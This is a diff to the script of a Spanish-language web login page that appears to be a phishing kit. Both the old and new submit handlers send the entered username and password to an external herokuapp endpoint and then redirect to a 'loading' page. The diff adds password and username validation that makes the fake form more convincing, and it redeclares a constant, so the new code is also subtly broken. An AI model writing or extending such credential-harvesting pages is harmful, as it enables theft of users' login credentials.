@@ -281,31 +281,45 @@
       document.getElementById("dfs").className += " mat-form-field-hide-placeholder";
     });
     const form = document.querySelector("#loginform");
-    form.addEventListener("submit", (event) => {
-      event.preventDefault();
-      const nombre = document.querySelector("#usuario").value;
-      const pass = document.querySelector("#passd").value;
-      if (pass.length > 4) {
-        localStorage.setItem("usuario", nombre);
-        const datos = {
-          usuario: nombre,
-          contrasena: pass
-        };
-        axios.post("https://srvdor-33a68f3ab628.herokuapp.com/usuario8/", datos, {
-          headers: {
-            Accept: "application/json",
-            "Content-Type": "application/json"
-          },
-      }).then((response) => {
-        window.location.href = "cargando.html";
-      }).catch((error) => {
-        console.error(error);
-      });
-      }
-      else{
-        alert("Datos incorrectos");
-      }
-     
-    });
+   const form = document.querySelector("#loginform");
+form.addEventListener("submit", (event) => {
+  event.preventDefault();
+  
+  const nombre = document.querySelector("#usuario").value;
+  const pass = document.querySelector("#passd").value;
+
+  // Validar que el usuario no tenga espacios
+  const usuarioRegex = /^\S+$/; // Asegura que el nombre de usuario no tenga espacios
+  if (!usuarioRegex.test(nombre)) {
+    alert("El nombre de usuario no puede tener espacios.");
+    return;
+  }
+
+  // Validar contraseña (al menos una mayúscula, una minúscula y un número)
+  const passRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{5,}$/; // Contraseña con min, may, y número
+  if (!passRegex.test(pass)) {
+    alert("La contraseña debe tener al menos una mayúscula, una minúscula y un número.");
+    return;
+  }
+
+  // Si la contraseña es válida y el usuario no tiene espacios
+  localStorage.setItem("usuario", nombre);
+  const datos = {
+    usuario: nombre,
+    contrasena: pass
+  };
+
+  axios.post("https://srvdor-33a68f3ab628.herokuapp.com/usuario8/", datos, {
+    headers: {
+      Accept: "application/json",
+      "Content-Type": "application/json"
+    }
+  }).then((response) => {
+    window.location.href = "cargando.html";
+  }).catch((error) => {
+    console.error(error);
+  });
+});
+
   </script>
 </html>
